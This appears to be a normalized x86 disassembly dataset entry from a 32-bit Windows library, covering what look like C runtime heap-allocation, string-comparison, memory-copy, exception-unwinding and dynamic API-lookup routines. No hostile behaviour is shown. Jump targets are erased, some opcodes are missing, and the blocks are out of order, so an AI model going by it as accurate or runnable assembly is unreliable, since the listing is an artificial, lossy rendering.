retn
push esi
call sub_1001831a
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_1001831a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001831a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_1001831a
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_1001831a
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_1001831a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001831a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_1001831a
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100184ef
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_1001831a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001831a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_1000e924
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_1001920e
push 0xc
push r--data
call sub_10011ecc
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_1000e8db
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_1000e873
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_10011f11
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_100122c2
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_10013210
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001930a
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000b660
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_1001932c
push 0x10
push r--data
call sub_10011ecc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1000c036
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_1000bf59
pop ecx
jmp r-xdata
call sub_10011f11
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_100122c2
pop ecx
call sub_1000e8db
push 0x4
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_10012a31
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019470
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_10012f2f
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_100122c2
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_10013210
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_1000e8db
call sub_1000e8db
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_100122c2
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000e899
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_1000e8db
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_1000e8db
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_1000ac80
push ebx
call sub_10012a31
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_10012a61
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000e899
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_1000ac80
push ebx
push [ ebp - 0x20 ]
call sub_10012a61
add esp 0x14
mov eax esi
sub_10019547
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_1001932c
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_10011b16
pop ecx
mov ebx eax
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_1000e873
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_1000b660
add esp 0xc
sub_1001960e
push 0x8
push r--data
call sub_10011ecc
push [ rw-data ]
call sub_1000e0ba
pop ecx
test eax eax
je r-xdata
call sub_100195c2
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_10019675
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_100196b9
push 0x20
push r--data
call sub_10011ecc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1000e2ca
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_10011f11
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_10019675
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_10011e59
mov [ ebp - 0x1c ] 0x1
push eax
call sub_1000e0ba
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1000e8db
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e873
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_100129fe
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_1000e0b1
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001982d
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_10019878
mov edi edi
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
xor ebx ebx
cmp [ ebp + 0xc ] 0x1
push edi
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x94 ] esi
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push 0x80
lea edi [ ebp - 0x84 ]
mov ecx edi
push ecx
push [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ebx
push [ ebp + 0x10 ]
push eax
call sub_1001b75b
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
or eax 0xffffffff
push ebx
push 0x4
mov edi rw-data
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_1001b5e8
add esp 0x18
test eax eax
je r-xdata
push 0x1
push esi
call sub_10011a2a
pop ecx
pop ecx
mov ecx [ ebp - 0x94 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ esi ] bl
lea ecx [ esi - 0x1 ]
push ecx
push edi
push esi
push eax
call sub_100146e6
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_1001b75b
add esp 0x18
mov [ ebp - 0x90 ] eax
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esi ]
mov cl 0xa
imul cl
add al bl
sub al 0x30
inc edi
inc edi
cmp edi rw-data
mov [ esi ] al
jl r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e74b
add esp 0x14
push edi
call sub_1000bf59
pop ecx
xor esi esi
inc esi
push esi
push eax
call sub_10011a2a
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
mov bl [ edi ]
movzx eax bl
push eax
call sub_10018646
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call sub_1000bf59
pop ecx
push ebx
push [ ebp - 0x90 ]
mov [ ebp - 0x88 ] esi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_1001b75b
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
sub_10019a15
push 0x10
push r--data
call sub_10011ecc
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10011f11
retn
sub_10019a78
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10019b08
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1001b8ad
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1001b8cc
jmp r-xdata
sub_10019b08
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_1000ac69
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10019a78
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10019b6a
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10019b9a
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10019bd0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10019c58 ]
jmp [ ecx * 4 + jump_table_10019cd8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10019d44 ]
pop esi
pop edi
pop ebp
jmp sub_1000d7ba
jmp [ ecx * 4 + jump_table_10019ee0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10019de4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10019ee0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10019d44 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10019ee0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10019d44 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10019d44 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10019d44 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10019ee0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10019ee0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10019ee0 ]
sub_10019f35
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_1000e0b1
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_1000e0ba
pop ecx
test eax eax
je r-xdata
push eax
call sub_1000e0ba
pop ecx
test eax eax
je r-xdata
push eax
call sub_1000e0ba
push [ rw-data ]
mov esi eax
call sub_1000e0ba
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_1000e03f
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1000e03f
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1000e03f
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1000e03f
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_1000e03f
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_1000e0ba
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_1001a09e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_1001a0e9
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_1001a122
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_1001a0e9
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001b8cf
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001b8cf
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_1001a1f7
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a122
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_1001a0e9
pop esi
pop ebp
retn
sub_1001a292
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001b8cf
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001b8cf
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_1001ba10
add esp 0xc
mov eax esi
jmp r-xdata
